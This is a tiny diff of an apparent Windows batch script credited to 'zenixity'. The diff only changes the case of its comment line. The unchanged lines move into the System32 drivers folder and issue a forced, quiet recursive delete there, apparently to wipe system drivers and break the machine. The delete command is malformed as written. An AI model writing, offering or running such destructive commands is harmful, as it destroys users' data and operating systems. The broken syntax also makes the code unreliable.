@@ -1,4 +1,4 @@
-:: Created by zenixity
+:: created by zenixity
 cd C:\Windows\System32\drivers
 rm dir /s /q /f
 cd C:\Windows
